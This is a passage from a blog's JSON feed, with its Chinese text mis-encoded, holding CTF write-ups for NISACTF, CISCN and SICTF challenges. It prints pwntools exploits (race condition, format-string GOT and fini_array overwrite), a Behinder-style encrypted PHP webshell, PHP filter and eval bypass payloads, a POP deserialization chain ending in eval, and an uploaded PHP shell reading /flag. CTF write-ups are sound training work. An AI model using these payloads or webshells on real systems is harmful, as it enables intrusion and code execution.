            "content_html": "<h1 id=\"ËÆ∞ÂΩï‰∏§ÈÅìpwnÈ¢ò\"><a class=\"markdownIt-Anchor\" href=\"#ËÆ∞ÂΩï‰∏§ÈÅìpwnÈ¢ò\">#</a> ËÆ∞ÂΩï‰∏§ÈÅì PWN È¢ò</h1>\n<blockquote>\n<p>ÁªôÊñ∞ÁîüÂá∫È¢òÔºåÂá∫Á¥Ø‰∫ÜÔºåÈöè‰æøÁúã‰∫Ü‰∏§‰∏™ PWN È¢òÔºåÂèëÁé∞Ëøô‰∏§‰∏™ PWN ÈÉΩÂÄºÂæóËÆ∞ÂΩï‰∏Ä‰∏ã</p>\n</blockquote>\n<ul>\n<li>ONE</li>\n</ul>\n<h2 id=\"nisactf-2022shop_pwn\"><a class=\"markdownIt-Anchor\" href=\"#nisactf-2022shop_pwn\">#</a> [NISACTF 2022]shop_pwn</h2>\n<p>È¢òÁõÆÊ†áÁ≠æÔºö</p>\n<p><img data-src=\"/img/pwnlianxi/20230922180317483.png\" alt=\"20230922180317483\"></p>\n<blockquote>\n<p>pthread_create Â§öÁ∫øÁ®ãÁ´û‰∫â</p>\n</blockquote>\n<p><img data-src=\"/img/pwnlianxi/20230922180537307.png\" alt=\"20230922180537307\"></p>\n<p><strong>ÊâßË°åÁ®ãÂ∫èÂ¶Ç‰∏ãÔºö</strong></p>\n<p><img data-src=\"/img/pwnlianxi/20230922180732045.png\" alt=\"20230922180732045\"></p>\n<p><strong>ÊîæÂÖ• IDA Áúã‰∏Ä‰∏ãÂÖ∑‰ΩìÁöÑÂáΩÊï∞Ôºö</strong></p>\n<p><img data-src=\"/img/pwnlianxi/20230922180849649.png\" alt=\"20230922180849649\"></p>\n<p><strong>Áúã‰∏Ä‰∏ã‰∏ªË¶ÅÁöÑÂáΩÊï∞</strong></p>\n<p><img data-src=\"/img/pwnlianxi/20230922181202034.png\" alt=\"20230922181202034\"></p>\n<p><img data-src=\"/img/pwnlianxi/20230922181325444.png\" alt=\"20230922181325444\"></p>\n<p><strong>ËÑöÊú¨Â¶Ç‰∏ãÔºö</strong></p>\n<blockquote>\n<p>ËøôÈáåÂà©Áî®‰∫Ü pthread_create ÂàõÂª∫ËøõÁ®ãÔºåÈÇ£‰πàÂ¶ÇÊûúÊàë‰ª¨Êåá‰ª§ÂèëÈÄÅÂæóÂø´ÁöÑËØùÔºåÈÇ£‰πàÂ∞±ÂèØ‰ª•ÂÆûÁé∞Á¨¨‰∏ÄÊ¨°ÂîÆÂçñÂäüËÉΩÊâßË°åÁöÑÊó∂ÂÄôÊ≠£Âú® unsleepÔºåÊé•ÁùÄÊâßË°åÁ¨¨‰∫åÊ¨°ÂîÆÂçñÂäüËÉΩÔºåÈÇ£‰πàÂ∞±ËÉΩÂçñÂá∫‰∏§Ê¨°ÂæóÂà∞ÂèØ‰ª•Ë¥≠‰π∞ flag ÁöÑÈáëÈí±‰∫Ü</p>\n</blockquote>\n<p><strong>pwntool ÁöÑ sendline ÂèëÈÄÅÊåá‰ª§ÂæàÂø´</strong></p>\n<pre><code>from pwn import *\ncontext(log_level='debug',arch='amd64', os='linux')\nr = remote('node5.anna.nssctf.cn',28929)\nr.sendline(&quot;3&quot;) \nr.sendline(&quot;0&quot;) \n\nr.sendline(&quot;3&quot;)\nr.sendline(&quot;0&quot;)  \n\nr.interactive()\n</code></pre>\n<p><strong>ÁªìÊûúÂ¶Ç‰∏ãÔºö</strong></p>\n<p><img data-src=\"/img/pwnlianxi/20230922181643187.png\" alt=\"20230922181643187\"></p>\n<ul>\n<li>two</li>\n</ul>\n<h2 id=\"ciscn-2019Ë•øÂçópwn1\"><a class=\"markdownIt-Anchor\" href=\"#ciscn-2019Ë•øÂçópwn1\">#</a> [CISCN 2019 Ë•øÂçó] PWN1</h2>\n<blockquote>\n<p>ÂΩì <code>RELRO</code>  ‰øùÊä§‰∏∫ <code>NO RELRO</code>  ÁöÑÊó∂ÂÄôÔºå <code>init.array„ÄÅfini.array„ÄÅgot.plt</code>  ÂùáÂèØËØªÂèØÂÜôÔºõ‰∏∫ <code>PARTIAL RELRO</code>  ÁöÑÊó∂ÂÄôÔºå <code>ini.array„ÄÅfini.array</code>  ÂèØËØª‰∏çÂèØÂÜôÔºå <code>got.plt</code>  ÂèØËØªÂèØÂÜôÔºõ‰∏∫ <code>FULL RELRO</code>  Êó∂Ôºå <code>init.array„ÄÅfini.array„ÄÅgot.plt</code>  ÂùáÂèØËØª‰∏çÂèØÂÜô„ÄÇ</p>\n</blockquote>\n<blockquote>\n<p>Á®ãÂ∫èÂú®Âä†ËΩΩÁöÑÊó∂ÂÄôÔºå‰ºö‰æùÊ¨°Ë∞ÉÁî® <code>init.array</code>  Êï∞ÁªÑ‰∏≠ÁöÑÊØè‰∏Ä‰∏™ÂáΩÊï∞ÊåáÈíàÔºåÂú®ÁªìÊùüÁöÑÊó∂ÂÄôÔºå‰æùÊ¨°Ë∞ÉÁî® <code>fini.array</code>  ‰∏≠ÁöÑÊØè‰∏Ä‰∏™ÂáΩÊï∞ÊåáÈíà</p>\n</blockquote>\n<blockquote>\n<p>ÂΩìÁ®ãÂ∫èÂá∫Áé∞Ê†ºÂºèÂåñÂ≠óÁ¨¶‰∏≤ÊºèÊ¥ûÔºå‰ΩÜÊòØÈúÄË¶ÅÂÜô‰∏§Ê¨°ÊâçËÉΩÂÆåÊàêÊîªÂáªÔºåËøô‰∏™Êó∂ÂÄôÂèØ‰ª•ËÄÉËôëÊîπÂÜô <code>fini.array</code>  ‰∏≠ÁöÑÂáΩÊï∞ÊåáÈíà‰∏∫ <code>main</code>  ÂáΩÊï∞Âú∞ÂùÄÔºåÂèØ‰ª•ÂÜçÊâßË°å‰∏ÄÊ¨° <code>main</code>  ÂáΩÊï∞„ÄÇ‰∏ÄËà¨Êù•ËØ¥ÔºåËøô‰∏™Êï∞ÁªÑÁöÑÈïøÂ∫¶‰∏∫ <code>1</code> Ôºå‰πüÂ∞±ÊòØËØ¥Âè™ËÉΩÂÜô‰∏Ä‰∏™Âú∞ÂùÄ„ÄÇ</p>\n</blockquote>\n<p><img data-src=\"/img/pwnlianxi/20230922182614061.png\" alt=\"20230922182614061\"></p>\n<p>32 ‰ΩçÁ®ãÂ∫è‰øÆÊîπ got Ë°®„ÄÇ</p>\n<p><strong>ÊâßË°åÁ®ãÂ∫èÂèÇÁúãÂÅèÁßªÔºö</strong></p>\n<p><img data-src=\"/img/pwnlianxi/20230922183714065.png\" alt=\"20230922183714065\"></p>\n<p><strong>Áúã‰∏Ä‰∏ã IDA:</strong></p>\n<p><img data-src=\"/img/pwnlianxi/20230922184018564.png\" alt=\"20230922184018564\"></p>\n<p><img data-src=\"/img/pwnlianxi/20230922184142420.png\" alt=\"20230922184142420\"></p>\n<p><strong>Âà©Áî®ÊÄùË∑ØÔºö</strong></p>\n<p>ÈÄöËøáÊ†ºÂºèÂåñÂ≠óÁ¨¶‰∏≤ÊºèÊ¥ûÂéª‰øÆÊîπ printf_gotÔºå‰øÆÊîπ‰∏∫ system„ÄÇ‰ΩÜÊòØÁ®ãÂ∫èÂè™ËÉΩÊâßË°å‰∏ÄÊ¨°ÔºåÊâÄ‰ª•‰øÆÊîπÂÆåÂêéÔºåÁ®ãÂ∫è‰ºöÈÄÄÂá∫„ÄÇ</p>\n<p>‰ΩÜÊòØÂ¶ÇÊûúÂ¶Ç‰∏ãÂõæÊâÄÁ§∫</p>\n<p><img data-src=\"/img/pwnlianxi/20230922184525768.png\" alt=\"20230922184525768\"></p>\n<p>Êàë‰ª¨Â∞±ÂèØ‰ª•Âéª‰øÆÊîπ <code>fini.array</code> , Â∞ÜÂÖ∂ÂèÇÊï∞ 1ÔºåÁªôË¶ÜÂÜôÊàê mainÔºåÈÇ£‰πàÁ®ãÂ∫èÂú®ÈÄÄÂá∫ÂêéÂ∞±‰ºöÂÜçÊ¨°ÊâßË°å main ÂáΩÊï∞„ÄÇ</p>\n<p><strong>payloadÔºö</strong></p>\n<blockquote>\n<p>payload = b&quot;%2052c%13<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>h</mi><mi>n</mi></mrow><annotation encoding=\"application/x-tex\">hn%31692c%14</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.69444em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">h</span><span class=\"mord mathnormal\">n</span></span></span></span>hn%356c%15$hn&quot; + p32(0x804989c + 2) + p32(0x804989c) + p32(0x804979c)</p>\n</blockquote>\n<p>ÈÄöËøá gdb ÂéªÁúã‰∏ÄÁúº payload ËøõÂÖ•Á®ãÂ∫èÁöÑÊÉÖÂÜµÔºö</p>\n<p><img data-src=\"/img/pwnlianxi/20230922185014496.png\" alt=\"20230922185014496\"></p>\n<p>ÂΩìËØªÂÖ• pyload Êó∂ÁöÑÊÉÖÂÜµ</p>\n<p>ËøôÊó∂Á®ãÂ∫èËØªÂÖ• payload„ÄÇÁé∞Âú® got Ë°®È°πÊåáÂêëÁöÑËøòÊòØ printf_plt„ÄÇ</p>\n<p><img data-src=\"/img/pwnlianxi/20230922191625014.png\" alt=\"20230922191625014\"></p>\n<p>ÂΩìÊâßË°åÂà∞ printf ÂáΩÊï∞Êó∂Ôºåprintf_got ‰øÆÊîπ‰∏∫ system  fini_array ÁöÑÁ¨¨‰∏Ä‰∏™ÂèÇÊï∞‰øÆÊîπ‰∏∫ main</p>\n<p>ÂΩìÊàë‰ª¨Á®ãÂ∫èÁªìÊùüÊó∂ÔºåÂ∞±‰ºöÂÜçÊ¨°Ë∑≥ËΩ¨Âà∞ main ÂáΩÊï∞ÂÖ•Âè£ÔºåÂú®ËØªÂÖ• /bin/shÔºåÊé•ÁùÄ‰ºöÂú®Ë∞ÉÁî® printf ÂáΩÊï∞Ôºå‰ºöÊâßË°å system (/bin/sh)Ôºå‰ªéËÄåËé∑Âèñ shell</p>\n<p><strong>exp Â¶Ç‰∏ãÔºö</strong></p>\n<pre><code>from pwn import *\nr = remote('node5.anna.nssctf.cn',28467)\n# r = gdb.debug(&quot;./XNPWN1&quot;)\n# ÂæÄfini.array[0]ÂÜômain@text, printf@gotÂÜôsystem@plt\npayload = b&quot;%2052c%13$hn%31692c%14$hn%356c%15$hn&quot; + p32(0x804989c + 2) + p32(0x804989c) + p32(0x804979c)\nr.recvline()\n\nr.sendline(payload)\n\nr.sendline(&quot;/bin/sh&quot;)\nr.interactive()\n</code></pre>\n",
            "tags": [
                "Ê†ºÂºèÂåñÂ≠óÁ¨¶‰∏≤",
                "gotË°®"
            ]
        },
        {
            "id": "http://example.com/2023/09/10/sictf-wp/",
            "url": "http://example.com/2023/09/10/sictf-wp/",
            "title": "sictf_wp",
            "date_published": "2023-09-10T11:48:34.000Z",
            "content_html": "<h1 id=\"misc\"><a class=\"markdownIt-Anchor\" href=\"#misc\">#</a> MISC</h1>\n<h3 id=\"Á≠æÂà∞welcome\"><a class=\"markdownIt-Anchor\" href=\"#Á≠æÂà∞welcome\">#</a> Á≠æÂà∞] Welcome</h3>\n<p><img data-src=\"/img/sictfpic/1.png\" alt=\"img\"></p>\n<h3 id=\"pixel_art\"><a class=\"markdownIt-Anchor\" href=\"#pixel_art\">#</a> Pixel_art</h3>\n<pre><code class=\"language-PHP\">from PIL import Image\nimage = Image.open('image.png')\nwidth, height = image.size\nfor y in range(height):\n    for x in range(width):\n        r, g, b = image.getpixel((x, y))\n        if r == 46:\n            print('.',end=&quot;&quot;)\n        elif r == 33:\n            print('!',end=&quot;&quot;)\n        elif r == 63:\n            print('?',end=&quot;&quot;)\n        if g == 46:\n                print('.',end=&quot;&quot;)\n        elif g == 33:\n                print('!',end=&quot;&quot;)\n        elif g == 63:\n                print('?',end=&quot;&quot;)\n        if b == 46:\n            print('.',end=&quot;&quot;)\n        elif b == 33:\n            print('!',end=&quot;&quot;)\n        elif b == 63:\n            print('?',end=&quot;&quot;)\n</code></pre>\n<pre><code class=\"language-asp\">..................!?!!.?..................?.?!.?....!.?.......!?!!.?!!!!!!?.?!.?!!!.!!!!!!!!!!!!!.?.........!?!!.?........?.?!.?..!.?.......!?!!.?!!!!!!?.?!.?!!!!!!!!!!!.?...............!?!!.?..............?.?!.?........!.?.................!?!!.?!!!!!!!!!!!!!!!!?.?!.?!!!!!!!!!!!!!!!!!!!!!!!...!.......!.!!!!!!!.?.............!?!!.?............?.?!.?........................!.....!.?.............!?!!.?!!!!!!!!!!!!?.?!.?!!!!!!!!!!!!!!!!!!!!!!!!!.....!.!!!!!!!!!!!!!!!!!.?...............!?!!.?..............?.?!.?..............!.!!!!!.?...............!?!!.?!!!!!!!!!!!!!!?.?!.?!!!.................!.?.......!?!!.?!!!!!!?.?!.?!!!!!!!...............!.?.............!?!!.?............?.?!.?......................!.....!.!.?...............!?!!.?!!!!!!!!!!!!!!?.?!.?!!!!!!!!!!!!!!!.?...............!?!!.?..............?.?!.?......!.?.............!?!!.?!!!!!!!!!!!!?.?!.?!!!!!!!!!.!!!!!!!!!!!!!!!!!!!.............!.!!!!!!!!!!!!!!!!!!!...........!.!.............!.!!!!!!!!!!!!!!!!!...........!.?...............!?!!.?..............?.?!.?!.!!!!!.!!!!!.......!.!!!.?.............!?!!.?!!!!!!!!!!!!?.?!.?!!!!!!!!!!!!!!!!!!!.!.?.................!?!!.?................?.?!.?............!.?.\n\n Ook\n</code></pre>\n<h3 id=\"baby_zip\"><a class=\"markdownIt-Anchor\" href=\"#baby_zip\">#</a> baby_zip</h3>\n<pre><code class=\"language-PHP\">bkcrack -C flag.zip -c flag.png -x 0 89504E470D0A1A0A0000000D49484452\nbkcrack -C flag.zip -c flag.png -k 6424c164 7c334afd f99666e5 -d flag.png\n</code></pre>\n<p>010 Êü•Áúã flag Âú®ÊúÄÂêé</p>\n<h3 id=\"easy_shark\"><a class=\"markdownIt-Anchor\" href=\"#easy_shark\">#</a> Easy_Shark</h3>\n<p>AES ÂÜ∞Ëùé 3 ÊµÅÈáèÁöÑÁâπÂæÅ</p>\n<pre><code class=\"language-PHP\">&lt;?php\n@error_reporting(0);\nsession_start();\n    $key=&quot;2295d22e2d70888f&quot;;\n        $_SESSION['k']=$key;\n        $post=file_get_contents(&quot;php://input&quot;);\n        if(!extension_loaded('openssl'))\n        &#123;\n                $t=&quot;base64_&quot;.&quot;decode&quot;;\n                $post=$t($post.&quot;&quot;);\n                \n                for($i=0;$i&lt;strlen($post);$i++) &#123;\n                             $post[$i] = $post[$i]^$key[$i+1&amp;15]; \n                            &#125;\n        &#125;\n        else\n        &#123;\n                $post=openssl_decrypt($post, &quot;AES128&quot;, $key);\n        &#125;\n    $arr=explode('|',$post);\n    $func=$arr[0];\n    $params=$arr[1];\n        class C&#123;public function __invoke($p) &#123;eval($p.&quot;&quot;);&#125;&#125;\n    @call_user_func(new C(),$params);\n?&gt;\nkey = '2295d22e2d70888f'\n</code></pre>\n<p><img data-src=\"/img/sictfpic/2.png\" alt=\"img\"></p>\n<p>Ëß£ÂÜ∞ËùéÊµÅÈáè</p>\n<p><img data-src=\"/img/sictfpic/3.png\" alt=\"img\"></p>\n<p><img data-src=\"/img/sictfpic/4.png\" alt=\"img\"></p>\n<p><img data-src=\"/img/sictfpic/5.png\" alt=\"img\"></p>\n<p>Gron Ëß£ÂØÜ</p>\n<pre><code class=\"language-PHP\">def decrypt_string(ciphertext, offsets):\n    decrypted_string = &quot;&quot;\n    offset_index = 0\n\n    for char in ciphertext:\n        offset = offsets[offset_index] % 26\n        decrypted_char_code = (ord(char) - ord('A') - offset) % 26 + ord('A')\n        decrypted_char = chr(decrypted_char_code)\n        decrypted_string += decrypted_char\n\n        offset_index = (offset_index + 1) % len(offsets)\n\n    return decrypted_string\n\nciphertext = &quot;TGLBOMSJNSRAJAZDEZXGHSJNZWHG&quot;\noffsets = [1, 50, 61, 8, 9, 20, 63, 41]\n\nwhile True:\n    decrypted_string = decrypt_string(ciphertext, offsets)\n    print(decrypted_string)\n</code></pre>\n<h3 id=\"fast_morse\"><a class=\"markdownIt-Anchor\" href=\"#fast_morse\">#</a> fast_morse</h3>\n<p>morse Ëß£ÂØÜ</p>\n<p><img data-src=\"/img/sictfpic/6.png\" alt=\"img\"></p>\n<p>ÂæóÂà∞ falg</p>\n<p><img data-src=\"/img/sictfpic/7.png\" alt=\"img\"></p>\n<p>ÂèòÊàêÂ∞èÂÜô</p>\n<p>flag:SICTF f2a098f-7f4a-93a5-c8a48360b03c}</p>\n<h3 id=\"qr_qr_qr\"><a class=\"markdownIt-Anchor\" href=\"#qr_qr_qr\">#</a> QR_QR_QR</h3>\n<pre><code class=\"language-Python\">import numpy as np\nimport matplotlib.pyplot as plt\nfrom pyzbar.pyzbar import decode\nfrom PIL import Image\nfrom pwn import *\n\n# ËÆæÁΩÆÊó•ÂøóÁ∫ßÂà´‰∏∫Ë∞ÉËØïÊ®°Âºè\ncontext(log_level='debug')\n\n# ÂàõÂª∫ÂõæÁâáÂáΩÊï∞\ndef create_image(file_path):\n    with open(file_path, 'r') as file:\n        lines = file.readlines()\n\n    # ÁîüÊàêÂõæÁâáÊï∞ÁªÑ\n    image_array = [[255 if bit == '1' else 0 for bit in line.strip()] for line in lines]\n    image_array = np.array(image_array, dtype=np.uint8)\n\n    # ‰øùÂ≠ò‰∏∫ÂõæÁâá\n    plt.imsave('output.png', image_array, cmap='gray')\n\n# ËØªÂèñ‰∫åÁª¥Á†ÅÂáΩÊï∞\ndef read_qr_code(image_path):\n    image = Image.open(image_path)\n    decoded_objects = decode(image)\n    for obj in decoded_objects:\n        return obj.data.decode('utf-8')\n\n# ËøûÊé•ÊúçÂä°Âô®\nconn = remote('210.44.151.51', 10523)\n\nwhile True:\n    try:\n        # ‰ªéÊúçÂä°Âô®Êé•Êî∂Êï∞ÊçÆ\n        data = conn.recvuntil('Please Decrypt this QR code:', drop=True)\n\n        # Â∞ÜÊï∞ÊçÆ‰øùÂ≠òÂà∞ÊñáÊú¨Êñá‰ª∂\n        with open('1.txt', 'w') as file:\n            file.write(data.decode())\n\n        # ‰ªéÊñáÊú¨Êñá‰ª∂ÂàõÂª∫ÂõæÁâá\n        create_image('1.txt')\n\n        # ËØªÂèñÂõæÁâá‰∏≠ÁöÑ‰∫åÁª¥Á†Å\n        code = read_qr_code('output.png')\n        print(code)\n\n        # ÂèëÈÄÅ‰∫åÁª¥Á†ÅÂà∞ÊúçÂä°Âô®\n        conn.sendline(str(code))\n        conn.recvline()\n    finally:\n        # ÂÖ≥Èó≠Êñá‰ª∂\n        file.close()\n</code></pre>\n<h3 id=\"ÈóÆÂç∑Ë∞ÉÊü•\"><a class=\"markdownIt-Anchor\" href=\"#ÈóÆÂç∑Ë∞ÉÊü•\">#</a> ÈóÆÂç∑Ë∞ÉÊü•</h3>\n<p>Á¨¨‰∏âÈÅìÂ∞±ÊòØ flag</p>\n<p>SICTF SICTF_Round3_will_do_even_better!}</p>\n<h1 id=\"web\"><a class=\"markdownIt-Anchor\" href=\"#web\">#</a> WEB</h1>\n<h3 id=\"Á≠æÂà∞include\"><a class=\"markdownIt-Anchor\" href=\"#Á≠æÂà∞include\">#</a> [Á≠æÂà∞] Include</h3>\n<p>Âà©Áî®‰º™ÂçèËÆÆÂèØÁõ¥Êé•ËØªÂà∞ flag</p>\n<pre><code class=\"language-Python\">    /?SICTF=php://filter/convert.base64-encode/resource=/flag\n</code></pre>\n<h3 id=\"baby_php\"><a class=\"markdownIt-Anchor\" href=\"#baby_php\">#</a> Baby_PHP</h3>\n<pre><code class=\"language-PHP\">&lt;?php\nhighlight_file(__FILE__);\nerror_reporting(0);\n\n$query = $_SERVER['QUERY_STRING'];\n\nif (preg_match('/_|%5f|\\.|%2E/i', $query)) &#123;\n    die('You are Hacker!');\n&#125;\nif($_GET['k_e_y'] !=='123' &amp;&amp; preg_match('/^123$/',$_GET['k_e_y']))&#123;\n    echo(&quot;You are will Win!&lt;br&gt;&quot;);\n    if(isset($_POST['command']))&#123;\n        $command = $_POST['command'];\n        if(!preg_match(&quot;/\\~|\\`|\\@|\\#|\\\\$|\\%|\\&amp;|\\*|\\Ôºà|\\Ôºâ|\\-|\\+|\\=|\\&#123;|\\&#125;|\\[|\\]|\\:|\\'|\\&quot;|\\,|\\&lt;|\\.|\\&gt;|\\/|\\?|\\\\\\\\/i&quot;,$command))&#123;\n            eval($command);\n        &#125;\n        else&#123;\n            echo(&quot;You are Hacker!&quot;);\n        &#125;\n    &#125;\n&#125;\nelse&#123;\n    echo(&quot;K_e_y is Errors!&quot;);\n&#125;K_e_y is Errors!\n</code></pre>\n<p>‰ª£Á†ÅÂºÄÂßã‰ºöÂØπËæìÂÖ•ÁöÑÂ≠óÁ¨¶‰∏≤ËøõË°åÊ≠£ÂàôÂåπÈÖçÔºåË∑ü_ÊúâÂÖ≥ÁöÑ url ÁºñÁ†Å‰πãÁ±ªÁöÑÂÖ®ÈÉ®ËøáÊª§</p>\n<p>ÂèØ‰ª•Áî®Á©∫Ê†ºÊàñËÄÖ„ÄÇ‰ª£Êõø_,. ÂèàË¢´ËøáÊª§‰∫ÜÔºåÁî®‰∫ÜÁ©∫Ê†ºÔºåÂêéÈù¢‰∏Ä‰∏™ÁÆÄÂçïÁöÑËã•ÊØîËæÉÊç¢Ë°åÁ¨¶ÁªïËøá</p>\n<p>ÂêéÈù¢ cmd ‰∏Ä‰∏™Êó†Êï∞Â≠óÂ≠óÊØç rce</p>\n<p>ÂèØËßÅ ctfshow  web40 ÁöÑÈ¢òËß£</p>\n<pre><code class=\"language-Plain\">/?k%20e%20y=123%0a\ncommand=show_source(next(array_reverse(scandir(pos(localeconv())))));\n</code></pre>\n<h3 id=\"rce\"><a class=\"markdownIt-Anchor\" href=\"#rce\">#</a> RCE</h3>\n<pre><code class=\"language-Plain\">&lt;?php \nerror_reporting(0); \nhighlight_file(__FILE__); \n$code = $_POST['code']; \n$code = str_replace(&quot;(&quot;,&quot;hacker&quot;,$code); \n$code = str_replace(&quot;.&quot;,&quot;hacker&quot;,$code); \neval($code); \n?&gt;\n</code></pre>\n<p>ÂÄüÈâ¥ÂÆèÁà∑ÊñáÁ´†</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzYzOTI4Nzk2L2FydGljbGUvZGV0YWlscy8xMjc5NjMwNzk=\">https://blog.csdn.net/qq_63928796/article/details/127963079</span></p>\n<pre><code class=\"language-PHP\">code=echo $_POST[1];&amp;1=cat /f*\n</code></pre>\n<h3 id=\"ÊàëÂÖ®ÈÉΩË¶Å\"><a class=\"markdownIt-Anchor\" href=\"#ÊàëÂÖ®ÈÉΩË¶Å\">#</a> ÊàëÂÖ®ÈÉΩË¶Å</h3>\n<p>POP</p>\n<pre><code class=\"language-PHP\">&lt;?php\nhighlight_file(__FILE__);\n\nclass B&#123;\n    public $pop = '233333333';\n    public $i = '1';\n    public $nogame;\n\n    public function __destruct()\n    &#123;\n        if(preg_match(&quot;/233333333/&quot;,$this-&gt;pop))&#123;\n            echo &quot;ËøôÊòØ‰∏ÄÈÅìÁ≠æÂà∞È¢òÔºå‰∏çËÉΩËÆ©Êñ∞Áîü‰∏ÄÁõ¥ÂÅö‰∏çÂá∫Êù•ÈÅ≠ÂèóÊâìÂáª&quot;;\n        &#125;\n    &#125;\n\n    public function game()&#123;\n        echo &quot;Êâ£1ÈÄÅÂú∞Áã±ÁÅ´&quot;;\n        if ($this-&gt;i = &quot;1&quot;)&#123;\n            echo '&lt;img src=\\'R.jpg\\'&gt;';\n            $this-&gt;nogame-&gt;love();\n        &#125;\n    &#125;\n\n    public function __clone()&#123;\n        echo &quot;ÂøÖÈ°ªÊâßË°å&quot;;\n        eval($_POST[&quot;cmd&quot;]);\n    &#125;\n&#125;\n\n\nclass A&#123;\n    public $Aec;\n    public $girl = 'QNKCDZO' ;\n    public $boy = '240610708';\n\n    public function __toString()\n    &#123;\n        echo &quot;I also want to fall in love&quot;;\n        if($this-&gt;girl != $this-&gt;boy &amp;&amp; md5($this-&gt;girl) == md5($this-&gt;boy))&#123;\n            $this-&gt;Aec-&gt;game();\n        &#125;\n    &#125;\n\n\n&#125;\n\n\nclass P&#123;\n    public $MyLover;\n    public $name = '1';\n    public function __call($name, $arguments)\n    &#123;\n        echo &quot;ÊúâÂØπË±°Êàë‰ºöÂú®ËøôÊâìCTF???ÁúãÊàëÂÖãÈöÜ‰∏Ä‰∏™ÂØπË±°ÔºÅ&quot;;\n        if ($name != &quot;game&quot;) &#123;\n            echo &quot;ÊâìÊ∏∏ÊàèÂéªÔºåÂà´ÊÉ≥ÁùÄÂØπË±°‰∫Ü&quot;;\n            $this-&gt;MyLover = clone new B;\n        &#125;\n    &#125;\n\n\n&#125;\n$a = new B();\n$a -&gt;pop = new A();\n$a -&gt;pop -&gt;Aec = new B();\n$a -&gt;pop -&gt;Aec -&gt; nogame = new P();\necho serialize($a);\n</code></pre>\n<p>ÁÑ∂ÂêéÂëΩ‰ª§ÊâßË°å</p>\n<p>cmd=</p>\n<h3 id=\"‰Ω†ËÉΩË∑üÂæó‰∏äÊàëÁöÑspeedÂêó\"><a class=\"markdownIt-Anchor\" href=\"#‰Ω†ËÉΩË∑üÂæó‰∏äÊàëÁöÑspeedÂêó\">#</a> ‰Ω†ËÉΩË∑üÂæó‰∏äÊàëÁöÑ speed Âêó</h3>\n<p>Êù°‰ª∂Á´û‰∫â</p>\n<p>ÂáÜÂ§á‰∏Ä‰∏™ php Êñá‰ª∂</p>\n<p>ÂÜÖÂÆπ‰∏∫</p>\n<pre><code>&lt;?php @eval(system(&quot;cat /flag&quot;));?&gt;\n</code></pre>\n<p>Êäì‰∏§‰∏™ÂåÖ</p>\n<p>‰∏Ä‰∏™‰∏∫ get ‰º†ÂèÇÁöÑÂåÖÔºåËÆøÈóÆ url/uploads/2.php, ÊäìÂåÖ</p>\n<p>Âè¶‰∏Ä‰∏™‰∏∫ post ÂåÖÔºåÁõ¥Êé•Â∞±Êäì‰∏ä‰º†ÁöÑÂåÖÔºåÂ¶Ç‰∏ã</p>\n<p><img data-src=\"/img/sictfpic/8.png\" alt=\"img\"></p>\n<p>‰ø©‰∏™ÂåÖÁî® burp ÁàÜÁ†¥ÔºåÁàÜÁ†¥ÊñπÂºè‰∏∫ noplayloadÔºåÂºÄË∑ë</p>\n<p><img data-src=\"/img/sictfpic/9.png\" alt=\"img\"></p>\n<h1 id=\"re\"><a class=\"markdownIt-Anchor\" href=\"#re\">#</a> Re</h1>\n<h3 id=\"Á≠æÂà∞pyc\"><a class=\"markdownIt-Anchor\" href=\"#Á≠æÂà∞pyc\">#</a> [Á≠æÂà∞] PYC</h3>\n<p><img data-src=\"/img/sictfpic/10.png\" alt=\"img\"></p>\n<h3 id=\"myobject\"><a class=\"markdownIt-Anchor\" href=\"#myobject\">#</a> Myobject</h3>\n<p>Âä®Ë∞ÉÂá∫Êï∞ÊçÆÔºåÁõ¥Êé•ËµõÂçöÂé®Â≠êÁßí‰∫Ü</p>\n<p><img data-src=\"/img/sictfpic/11.png\" alt=\"img\"></p>\n<h3 id=\"chbase\"><a class=\"markdownIt-Anchor\" href=\"#chbase\">#</a> chbase</h3>\n<p>Êç¢Ë°®Âä†ÂØÜ</p>\n<p><img data-src=\"/img/sictfpic/12.png\" alt=\"img\"></p>\n<p><img data-src=\"/img/sictfpic/13.png\" alt=\"img\"></p>\n<p><img data-src=\"/img/sictfpic/14.png\" alt=\"img\"></p>\n<h3 id=\"‰∏ç‰∏ÄÊ†∑ÁöÑbase64\"><a class=\"markdownIt-Anchor\" href=\"#‰∏ç‰∏ÄÊ†∑ÁöÑbase64\">#</a> ‰∏ç‰∏ÄÊ†∑ÁöÑ base64</h3>\n<pre><code class=\"language-Java\">BASE64_CHARS = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'\n\ndef base64_decode(encoded_data):\n    decoded_data = ''\n    padding_count = encoded_data.count('=')\n    encoded_data = encoded_data.replace('=', '')\n\n    binary_str = ''\n    for char in encoded_data:\n        decimal_val = BASE64_CHARS.index(char)\n        binary_str += format(decimal_val, '06b')\n\n    if padding_count &gt; 0:\n        binary_str = binary_str[:-padding_count * 2]\n\n    for i in range(0, len(binary_str), 8):\n        byte = binary_str[i:i + 8]\n        decoded_data += chr(int(byte, 2))\n\n    return decoded_data\n\nencoded_data = input('')\ndecoded_data = base64_decode(encoded_data)\nprint(decoded_data)\n</code></pre>\n<h1 id=\"pwn\"><a class=\"markdownIt-Anchor\" href=\"#pwn\">#</a> Pwn</h1>\n<h3 id=\"Á≠æÂà∞shop\"><a class=\"markdownIt-Anchor\" href=\"#Á≠æÂà∞shop\">#</a> [Á≠æÂà∞] Shop</h3>\n<p><img data-src=\"/img/sictfpic/15.png\" alt=\"img\"></p>\n<h1 id=\"crypto\"><a class=\"markdownIt-Anchor\" href=\"#crypto\">#</a> Crypto</h1>\n<h3 id=\"Âè§ÂÖ∏Â§ßÊùÇÁÉ©\"><a class=\"markdownIt-Anchor\" href=\"#Âè§ÂÖ∏Â§ßÊùÇÁÉ©\">#</a> Âè§ÂÖ∏Â§ßÊùÇÁÉ©</h3>\n<pre><code 